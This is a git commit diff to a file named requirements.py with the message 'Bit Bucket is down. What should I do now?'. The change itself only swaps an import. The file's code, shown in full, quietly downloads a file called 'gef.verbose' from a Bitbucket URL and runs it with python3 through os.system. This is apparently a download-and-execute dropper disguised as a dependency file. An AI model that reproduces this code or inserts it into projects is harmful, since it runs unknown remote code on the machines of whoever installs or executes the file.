ea7de777e316b197358cde51ee561178fbde8145
gakira munshi <gakimarki@proton.me>
2024-12-17 20:56:56 -0500

    Bit Bucket is down. What should I do now?

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,stringprep
+import os, sys,io
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
